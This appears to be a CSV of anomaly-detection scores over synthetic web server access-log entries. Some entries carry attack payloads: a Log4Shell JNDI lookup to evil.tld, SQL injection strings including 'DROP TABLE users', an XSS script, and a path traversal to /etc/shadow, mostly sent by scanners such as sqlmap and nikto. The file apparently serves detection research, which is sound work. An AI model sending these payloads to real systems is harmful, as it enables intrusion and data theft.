score_content,score_session,score_fused,score_fused_norm,line
72.68785858154297,,72.68785858154297,72.68785858154297,{"remote_addr": "152.85.6.185", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /contact HTTP/2", "status": 204, "body_bytes_sent": 8593, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
104.04789733886719,,104.04789733886719,104.04789733886719,{"remote_addr": "141.195.23.159", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 15696, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
126.41177368164062,,126.41177368164062,126.41177368164062,{"remote_addr": "243.155.238.18", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.12003231048584,,13.12003231048584,13.12003231048584,{"remote_addr": "226.99.142.218", "time_local": "11/Jan/2025:09:05:50 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15827, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
95.0266342163086,,95.0266342163086,95.0266342163086,{"remote_addr": "177.86.226.20", "time_local": "11/Jan/2025:09:05:51 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 15936, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
126.2931137084961,,126.2931137084961,126.2931137084961,{"remote_addr": "55.35.12.184", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 17541, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
2.0764665603637695,,2.0764665603637695,2.0764665603637695,{"remote_addr": "2.28.78.233", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2272, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.9756089448928833,,1.9756089448928833,1.9756089448928833,{"remote_addr": "191.85.132.134", "time_local": "11/Jan/2025:09:05:53 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16629, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.207472801208496,,13.207472801208496,13.207472801208496,{"remote_addr": "46.11.154.19", "time_local": "11/Jan/2025:09:05:54 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 10262, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30184.904296875,,30184.904296875,30184.904296875,{"remote_addr": "84.212.229.210", "time_local": "11/Jan/2025:09:05:55 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1193, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
27.069385528564453,,27.069385528564453,27.069385528564453,{"remote_addr": "158.127.22.228", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 10459, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
5.027614116668701,,5.027614116668701,5.027614116668701,{"remote_addr": "12.22.90.121", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 8721, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
69.53172302246094,,69.53172302246094,69.53172302246094,{"remote_addr": "209.187.96.182", "time_local": "11/Jan/2025:09:05:57 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 11347, "http_referer": "-", "http_user_agent": "dirb/2.22"}
126.26045227050781,,126.26045227050781,126.26045227050781,{"remote_addr": "51.72.186.152", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 6602, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
13.121526718139648,,13.121526718139648,13.121526718139648,{"remote_addr": "70.22.70.105", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16389, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
27.24938201904297,,27.24938201904297,27.24938201904297,{"remote_addr": "94.187.221.201", "time_local": "11/Jan/2025:09:05:59 -0700", "request": "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 6570, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
126.32764434814453,,126.32764434814453,126.32764434814453,{"remote_addr": "192.85.76.122", "time_local": "11/Jan/2025:09:06:00 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14069, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.270917892456055,,27.270917892456055,27.270917892456055,{"remote_addr": "176.163.28.7", "time_local": "11/Jan/2025:09:06:01 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 12129, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
27.132200241088867,,27.132200241088867,27.132200241088867,{"remote_addr": "10.29.167.70", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 14906, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
47.419925689697266,,47.419925689697266,47.419925689697266,{"remote_addr": "32.54.38.89", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 4528, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
73.94027709960938,,73.94027709960938,73.94027709960938,{"remote_addr": "199.189.53.254", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 304, "body_bytes_sent": 16852, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
126.4063949584961,,126.4063949584961,126.4063949584961,{"remote_addr": "122.34.104.49", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 14796, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
94.89033508300781,,94.89033508300781,94.89033508300781,{"remote_addr": "173.246.68.238", "time_local": "11/Jan/2025:09:06:05 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6680, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
69.56072235107422,,69.56072235107422,69.56072235107422,{"remote_addr": "129.198.214.159", "time_local": "11/Jan/2025:09:06:06 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 480, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
0.19584231078624725,,0.19584231078624725,0.19584231078624725,{"remote_addr": "190.153.135.111", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3657, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.143220901489258,,27.143220901489258,27.143220901489258,{"remote_addr": "189.167.36.232", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.4338321685791,,24.4338321685791,24.4338321685791,{"remote_addr": "121.149.105.224", "time_local": "11/Jan/2025:09:06:08 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 13833, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
4.743195056915283,,4.743195056915283,4.743195056915283,{"remote_addr": "232.112.94.120", "time_local": "11/Jan/2025:09:06:09 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 10114, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.230944633483887,,13.230944633483887,13.230944633483887,{"remote_addr": "114.121.167.213", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 5867, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
47.14912033081055,,47.14912033081055,47.14912033081055,{"remote_addr": "201.140.229.237", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 10175, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
52.615177154541016,,52.615177154541016,52.615177154541016,{"remote_addr": "16.94.136.240", "time_local": "11/Jan/2025:09:06:11 -0700", "request": "DELETE /api/user?id=1;DROP TABLE users HTTP/2", "status": 304, "body_bytes_sent": 15904, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
49.6478385925293,,49.6478385925293,49.6478385925293,{"remote_addr": "6.134.63.179", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 201, "body_bytes_sent": 16212, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
72.9940185546875,,72.9940185546875,72.9940185546875,{"remote_addr": "102.212.95.135", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "OPTIONS / HTTP/2", "status": 204, "body_bytes_sent": 14226, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
11.427370071411133,,11.427370071411133,11.427370071411133,{"remote_addr": "149.56.34.29", "time_local": "11/Jan/2025:09:06:13 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 14788, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
5.034729480743408,,5.034729480743408,5.034729480743408,{"remote_addr": "33.7.41.146", "time_local": "11/Jan/2025:09:06:14 -0700", "request": "POST / HTTP/2", "status": 204, "body_bytes_sent": 13262, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
47.05070495605469,,47.05070495605469,47.05070495605469,{"remote_addr": "215.119.193.244", "time_local": "11/Jan/2025:09:06:15 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10245, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
24.2960205078125,,24.2960205078125,24.2960205078125,{"remote_addr": "230.55.175.93", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 17454, "http_referer": "-", "http_user_agent": "dirb/2.22"}
29.932281494140625,,29.932281494140625,29.932281494140625,{"remote_addr": "119.233.142.98", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "POST /search?q=monitor HTTP/2", "status": 302, "body_bytes_sent": 13297, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30212.111328125,,30212.111328125,30212.111328125,{"remote_addr": "147.69.206.138", "time_local": "11/Jan/2025:09:06:17 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 400, "body_bytes_sent": 1011, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
104.0142593383789,,104.0142593383789,104.0142593383789,{"remote_addr": "81.97.191.1", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 17353, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
11.468659400939941,,11.468659400939941,11.468659400939941,{"remote_addr": "193.233.1.65", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 685, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.051311492919922,,27.051311492919922,27.051311492919922,{"remote_addr": "96.192.162.159", "time_local": "11/Jan/2025:09:06:19 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "-", "http_user_agent": "dirb/2.22"}
49.98991394042969,,49.98991394042969,49.98991394042969,{"remote_addr": "140.62.185.48", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /contact HTTP/2", "status": 301, "body_bytes_sent": 4417, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.20211410522461,,47.20211410522461,47.20211410522461,{"remote_addr": "179.171.183.90", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /about HTTP/2", "status": 201, "body_bytes_sent": 4204, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.08992004394531,,47.08992004394531,47.08992004394531,{"remote_addr": "254.184.179.129", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1038, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
69.40176391601562,,69.40176391601562,69.40176391601562,{"remote_addr": "194.94.203.116", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 204, "body_bytes_sent": 11968, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
27.130399703979492,,27.130399703979492,27.130399703979492,{"remote_addr": "102.224.30.153", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 13911, "http_referer": "-", "http_user_agent": "dirb/2.22"}
7.546329975128174,,7.546329975128174,7.546329975128174,{"remote_addr": "109.112.194.173", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /dashboard HTTP/2", "status": 301, "body_bytes_sent": 15121, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
13.250826835632324,,13.250826835632324,13.250826835632324,{"remote_addr": "246.53.67.54", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 540, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
72.75251770019531,,72.75251770019531,72.75251770019531,{"remote_addr": "232.6.5.156", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 2068, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
126.3444595336914,,126.3444595336914,126.3444595336914,{"remote_addr": "250.96.208.122", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10328, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
52.56474685668945,,52.56474685668945,52.56474685668945,{"remote_addr": "39.180.174.230", "time_local": "11/Jan/2025:09:06:25 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 16013, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.243765830993652,,13.243765830993652,13.243765830993652,{"remote_addr": "26.215.116.80", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "PUT /admin HTTP/2", "status": 200, "body_bytes_sent": 9753, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
129.2731170654297,,129.2731170654297,129.2731170654297,{"remote_addr": "34.152.164.74", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 304, "body_bytes_sent": 437, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
2.041377544403076,,2.041377544403076,2.041377544403076,{"remote_addr": "220.205.250.187", "time_local": "11/Jan/2025:09:06:27 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1536, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
69.6533203125,,69.6533203125,69.6533203125,{"remote_addr": "20.73.124.226", "time_local": "11/Jan/2025:09:06:28 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 5068, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
26.993101119995117,,26.993101119995117,26.993101119995117,{"remote_addr": "145.36.79.7", "time_local": "11/Jan/2025:09:06:28 -0700", "request": "POST /search?q=headphones HTTP/2", "status": 204, "body_bytes_sent": 12037, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.094073295593262,,13.094073295593262,13.094073295593262,{"remote_addr": "153.188.76.243", "time_local": "11/Jan/2025:09:06:29 -0700", "request": "PUT /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 17829, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
103.9559326171875,,103.9559326171875,103.9559326171875,{"remote_addr": "94.70.210.126", "time_local": "11/Jan/2025:09:06:30 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 9611, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
